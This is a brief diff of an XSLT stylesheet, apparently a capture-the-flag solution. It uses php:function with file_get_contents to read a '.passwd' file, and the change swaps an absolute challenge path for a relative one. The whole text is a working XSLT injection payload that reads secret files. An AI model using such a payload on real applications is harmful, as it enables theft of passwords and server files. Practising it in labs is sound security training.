@@ -2,7 +2,7 @@
 <xsl:template match="/">
 
 
-    <xsl:value-of select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')"/>
+    <xsl:value-of select="php:function('file_get_contents','.passwd')"/>
     
     </xsl:template>
 </xsl:stylesheet>
